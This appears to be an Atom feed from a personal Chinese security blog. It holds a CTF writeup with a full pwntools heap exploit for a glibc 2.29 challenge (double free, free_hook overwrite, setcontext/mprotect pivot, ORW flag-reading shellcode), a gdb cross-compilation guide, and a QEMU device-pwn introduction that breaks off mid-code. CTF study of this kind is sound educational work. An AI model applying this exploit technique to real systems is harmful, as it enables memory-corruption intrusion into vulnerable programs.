<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>木头的小木屋</title>
  
  <subtitle>吃饱混天黑？</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="wood1314.github.io/"/>
  <updated>2021-10-14T15:46:17.816Z</updated>
  <id>wood1314.github.io/</id>
  
  <author>
    <name>Wood</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>长城杯writeup</title>
    <link href="wood1314.github.io/year/10/14/ckur473f5005lab15sy2oqzrb/"/>
    <id>wood1314.github.io/year/10/14/ckur473f5005lab15sy2oqzrb/</id>
    <published>2021-10-14T15:37:01.000Z</published>
    <updated>2021-10-14T15:46:17.816Z</updated>
    
    <content type="html"><![CDATA[<p>当时没时间写，后面用自己本地2.29libc的环境复现了下，libc2.29打free_hook orw的模板</p><a id="more"></a><h2 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h2><p>libc2.29 具有doble free的漏洞，具有add，show，edit，delete的功能，但只能申请0x60大小以下的堆块，并且需要orw</p><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ul><li>泄漏堆地址后，修改一个chunk的size大于0x440,free掉后从而泄漏libc地址</li><li>在堆上布置好shellcode，frame内容后把 free_hook更改为2.29特殊的gadget，然后free掉一个堆快来设置rdi和rdx</li></ul><h2 id="0x03-小trick"><a href="#0x03-小trick" class="headerlink" title="0x03 小trick"></a>0x03 小trick</h2><p>搜索2.29 从rdi转到rdx的gadget</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ./libc-2.29.so --search 'mov rdx'|grep "rdi + 8"</span><br></pre></td></tr></table></figure><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process('./pwn')</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line">#sh = remote('47.104.175.110',20066)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.arch = 'amd64'</span><br><span class="line">context.os = 'linux'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="function">def <span class="title">menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil("&gt;&gt; \n")</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('input size:\n')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">move</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">    sh.recvuntil('input index:\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('context:\n')</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">menu</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line">    sh.recvuntil('\n')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">15</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">1</span>, <span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">heap_base </span>= u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x9f0</span></span><br><span class="line">log.success('heap_base: ' + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">15</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x40</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">0</span>, p64(heap_base + <span class="number">0x1210</span><span class="number">-0x10</span>) + <span class="string">'\n'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x60</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>, <span class="number">0x60</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">edit</span><span class="params">(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span><span class="number">-0x50</span>+<span class="number">0x10</span>) + <span class="string">'\n'</span>)</span></span></span><br><span class="line"><span class="function"><span class="meta"># add(1,0x40)</span></span></span><br><span class="line"><span class="function"><span class="title">move</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">libc_base </span>= u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">IO_file_jumps = <span class="number">0x1e6560</span> + libc_base</span><br><span class="line">IO_str_jumps = libc_base + <span class="number">0x1e6620</span></span><br><span class="line">binsh_addr = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">stdout_file = libc_base + <span class="number">0x1e5680</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line">mov rax,<span class="number">0x67616c662f2e</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rsi,<span class="number">0</span></span><br><span class="line">mov rdx,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">2</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,<span class="number">1024</span></span><br><span class="line">mov rax,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">1</span></span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,rax</span><br><span class="line">mov rax,<span class="number">1</span></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,<span class="number">0</span></span><br><span class="line">mov rax,<span class="number">60</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x2500</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym['mprotect'] + libc_base</span><br><span class="line"></span><br><span class="line">payload = str(frame)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(str(frame)), <span class="number">0x60</span>):</span><br><span class="line">    move(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2000</span> + i) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload[i:i+<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">shellcode =p64(heap_base + <span class="number">0x2500</span> + <span class="number">8</span>) + <span class="keyword">asm</span>(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>, len(shellcode), <span class="number">0x60</span>):</span><br><span class="line">    move(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x2500</span> +i) + <span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>, shellcode[i:i+<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">gadget = <span class="number">0x12be97</span> + libc_base</span><br><span class="line"></span><br><span class="line">set_contextaddr = libc_base + libc.sym['setcontext']</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'\n'</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(heap_base + <span class="number">0x3000</span> +i) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_contextaddr+<span class="number">53</span>) + p64(heap_base + <span class="number">0x2000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'\n'</span>)</span><br><span class="line">move(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook) + <span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">move(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/" target="_blank" rel="noopener">https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/</a></p><p><a href="https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more">https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more</a></p><p><a href="https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/" target="_blank" rel="noopener">https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当时没时间写，后面用自己本地2.29libc的环境复现了下，libc2.29打free_hook orw的模板&lt;/p&gt;
    
    </summary>
    
      <category term="pwn题writeup" scheme="wood1314.github.io/categories/pwn%E9%A2%98writeup/"/>
    
    
      <category term="pwn writeup" scheme="wood1314.github.io/tags/pwn-writeup/"/>
    
  </entry>
  
  <entry>
    <title>gdb交叉编译</title>
    <link href="wood1314.github.io/year/10/13/ckur473dy001fab15yq7eo5p0/"/>
    <id>wood1314.github.io/year/10/13/ckur473dy001fab15yq7eo5p0/</id>
    <published>2021-10-13T15:43:48.000Z</published>
    <updated>2021-10-14T15:30:12.089Z</updated>
    
    <content type="html"><![CDATA[<p>最近在编译gdb和交叉编译gdb的时候学习到的一些东西</p><a id="more"></a><p><img src="/13/ckur473dy001fab15yq7eo5p0/liujiamu/blog/source/_posts/gdb%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/1.png" alt></p><p><img src="/13/ckur473dy001fab15yq7eo5p0/liujiamu/blog/source/_posts/gdb%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/2.png" alt></p><h2 id="0x01-configure、-make、-make-install-背后的原理"><a href="#0x01-configure、-make、-make-install-背后的原理" class="headerlink" title="0x01 configure、 make、 make install 背后的原理"></a>0x01 configure、 make、 make install 背后的原理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>接下来让我们深入 Unix 去搞清楚这几行命令的作用。</p><h3 id="做了什么"><a href="#做了什么" class="headerlink" title="做了什么"></a>做了什么</h3><p>整个过程分为三步：</p><ol><li>配置</li></ol><p><code>configure</code> 脚本负责在你使用的系统上准备好软件的构建环境。确保接下来的构建和安装过程所需要的依赖准备好，并且搞清楚使用这些依赖需要的东西。</p><p>Unix 程序一般是用 C 语言写的，所以我们通常需要一个 C 编译器去构建它们。在这个例子中 <code>configure</code> 要做的就是确保系统中有 C 编译器，并确定它的名字和路径。</p><ol><li>构建</li></ol><p>当 <code>configure</code> 配置完毕后，可以使用 <code>make</code> 命令执行构建。这个过程会执行在 <code>Makefile</code> 文件中定义的一系列任务将软件源代码编译成可执行文件。</p><p>你下载的源码包一般没有一个最终的 <code>Makefile</code> 文件，一般是一个模版文件 <code>Makefile.in</code> 文件，然后 <code>configure</code> 根据系统的参数生成一个定制化的 <code>Makefile</code> 文件。</p><ol><li>安装</li></ol><p>现在软件已经被构建好并且可以执行，接下来要做的就是将可执行文件复制到最终的路径。<code>make install</code> 命令就是将可执行文件、第三方依赖包和文档复制到正确的路径。</p><p>这通常意味着，可执行文件被复制到某个 <code>PATH</code> 包含的路径，程序的调用文档被复制到某个 <code>MANPATH</code> 包含的路径，还有程序依赖的文件也会被存放在合适的路径。</p><p>因为安装这一步也是被定义在 <code>Makefile</code> 中，所以程序安装的路径可以通过 <code>configure</code> 命令的参数指定，或者 <code>configure</code> 通过系统参数决定。</p><p>如果要将可执行文件安装在系统路径，执行这步需要赋予相应的权限，一般是通过 sudo。</p><p><strong>安装过程简单说就是 configure 脚本根据系统信息将 <a href="http://makefile.in/" target="_blank" rel="noopener">Makefile.in</a> 模版文件转换为 Makefile文件</strong></p><h3 id="1-1-build-–host-–target"><a href="#1-1-build-–host-–target" class="headerlink" title="1.1 -build –host –target"></a>1.1 -build –host –target</h3><p>源码经过编译生成可执行程序。根据执行编译操作的平台、可执行程序的运行平台、可执行的程序的处理平台，可以将编译操作分为多种类型，对应的三个配置参数如下：</p><ul><li><strong>–build</strong>：运行编译工具链的平台，也就是正在执行编译操作的平台。如果未指定此参数，则通过 config.guess 猜测得到。通常都不指定此参数。</li><li><strong>-host</strong>：可执行程序将运行的平台。如果未指定此参数，则和 –build 相同<code>。如果 --host 和 --build 不同，是交叉编译；否则是普通编译。</code></li><li><strong>-target</strong>：<code>可执行程序将处理的平台。</code>如果未指定此参数，则和 –host 相同。一般来说，程序运行在什么平台，处理的就是什么平台，此参数值和 –host 参数相同，不需显式指定，所以通常不会关注到此参数。但在制作交叉编译工具 (如 gcc、gdb 等) 这种特殊情况下，此值和 –host 不同，例如交叉编译器 arm-linux-gcc，它运行在 x86-linux 平台 (–host 参数)，但处理的是 arm-linux 平台 (–target 参数)。如果是交叉编译一个普通的应用，如运行于 arm-linux 平台的 tftp 程序，则它的运行平台和处理平台都是 arm-linux 平台。</li></ul><h3 id="1-2交叉编译gdb-mips-架构"><a href="#1-2交叉编译gdb-mips-架构" class="headerlink" title="1.2交叉编译gdb(mips 架构)"></a>1.2交叉编译gdb(mips 架构)</h3><p>如果是交叉编译gdb，只设置host参数就可以了。target默认会和host参数相同。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --host=mipsel-openwrt-linux CC=mipsel-linux-gnu-gcc CXX=mipsel-linux-gnu-g++ CFLAGS=-static</span><br></pre></td></tr></table></figure><h3 id="1-3-64位环境下编译32位gdb"><a href="#1-3-64位环境下编译32位gdb" class="headerlink" title="1.3 64位环境下编译32位gdb"></a>1.3 64位环境下编译32位gdb</h3><p>需要依赖libdeflate库，因此先将libdflate库安装到指定文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo make CFLAGS=<span class="string">"-m32"</span></span><br><span class="line">sudo make install DESTDIR=/home/giantbranch/IOT/Tfuzz/<span class="built_in">test</span>/i386 CFLAGS=<span class="string">"-m32"</span></span><br></pre></td></tr></table></figure><p>然后编译gdb</p><ul><li>clean清除</li><li>消除掉原来的cache</li><li>重新设置config</li><li>在make时指定我们编译libdelate库的位置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">find . -name <span class="string">"*.cache"</span> | xargs rm -rf</span><br><span class="line">./configure --target=i386-linux  CFLAGS=<span class="string">"-static -m32"</span></span><br><span class="line">make  LDFLAGS+=<span class="string">"-L /home/giantbranch/IOT/Tfuzz/test/i386/usr/local/lib"</span></span><br></pre></td></tr></table></figure><h3 id="1-4-正常编译64位gdb"><a href="#1-4-正常编译64位gdb" class="headerlink" title="1.4 正常编译64位gdb"></a>1.4 正常编译64位gdb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">find . -name <span class="string">"*.cache"</span> | xargs rm -rf</span><br><span class="line">./configure CFLAGS=<span class="string">"-static"</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="1-5-查看交叉编译链适配环境"><a href="#1-5-查看交叉编译链适配环境" class="headerlink" title="1.5 查看交叉编译链适配环境"></a>1.5 查看交叉编译链适配环境</h3><p><img src="/13/ckur473dy001fab15yq7eo5p0/liujiamu/blog/source/_posts/gdb%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/3.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://thoughtbot.com/blog/the-magic-behind-configure-make-make-install" target="_blank" rel="noopener">The magic behind configure, make, make install (thoughtbot.com)</a></p><p><a href="https://seisman.github.io/how-to-write-makefile/introduction.html" target="_blank" rel="noopener">makefile介绍 — 跟我一起写Makefile 1.0 文档 (seisman.github.io)</a></p><p><a href="https://sourceware.org/gdb/wiki/BuildingCrossGDBandGDBserver" target="_blank" rel="noopener">BuildingCrossGDBandGDBserver - GDB Wiki (sourceware.org)</a></p><p><a href="https://tsaiyuyan.github.io/2019/05/17/ubuntu-jian-li-gdb-cross-complier-kai-fa-huan-jing/#toc-heading-1" target="_blank" rel="noopener">Ubuntu 建立 gdb cross-complier 開發環境 | YuYan’s blog (tsaiyuyan.github.io)</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/" target="_blank" rel="noopener">IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在编译gdb和交叉编译gdb的时候学习到的一些东西&lt;/p&gt;
    
    </summary>
    
    
      <category term="gdb 工具" scheme="wood1314.github.io/tags/gdb-%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>qemu初探</title>
    <link href="wood1314.github.io/year/03/07/ckur473ei003aab15tscs2ng1/"/>
    <id>wood1314.github.io/year/03/07/ckur473ei003aab15tscs2ng1/</id>
    <published>2021-03-07T10:55:03.000Z</published>
    <updated>2021-03-07T14:23:44.226Z</updated>
    
    <content type="html"><![CDATA[<p>qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。目前qemu出问题比较多的地方以及比赛中出题目的形式都在在设备模拟中。</p><p>所以其实这种题型一般就是关注它描述设备自定义的那个设备结构体还有与这个设备通信的相关函数。</p><a id="more"></a><h2 id="0x01-qemu基础"><a href="#0x01-qemu基础" class="headerlink" title="0x01 qemu基础"></a>0x01 qemu基础</h2><p>主要参考这篇博客吧<a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)</a>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如<code>IN/OUT</code>访问I/O端口。</p><h3 id="1-1-查看pci设备"><a href="#1-1-查看pci设备" class="headerlink" title="1.1 查看pci设备"></a>1.1 查看pci设备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p><h2 id="0x02-2021-AntCtf-d3dev"><a href="#0x02-2021-AntCtf-d3dev" class="headerlink" title="0x02 2021 AntCtf d3dev"></a>0x02 2021 AntCtf d3dev</h2><h3 id="2-1-设备分析"><a href="#2-1-设备分析" class="headerlink" title="2.1 设备分析"></a>2.1 设备分析</h3><p>首先可以通过d3dev_class_init来判断它是哪个设备，与lspci列表下的设备对比，发现对应设备是<code>/sys/devices/pci0000:00/0000:00:03.0</code></p><p>然后一般来讲，设备的数据类型IDA是没有自动加载的，需要我们手动加载一下。在IDA-&gt;views-&gt;subview-&gt;localtype里搜索 d3 可以找到这个设备结构体，用了这个结构体以后代码就好看很多了。</p><p><img src="/07/ckur473ei003aab15tscs2ng1/2.png" alt></p><h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="pmio-write"><a href="#pmio-write" class="headerlink" title="pmio_write"></a>pmio_write</h4><p>首先看pmio_write函数，主要功能就四个</p><ul><li>addr为8时设置seek</li><li>addr为28时调用r_rand函数</li><li>addr为4时将key重置</li><li>设置memory_mode</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t *v4; // rbp</span><br><span class="line"></span><br><span class="line">  if ( addr == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( val &lt;= 0x100 )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( addr &gt; 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 28 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      do</span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  28LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( addr == 4 )</span><br><span class="line">    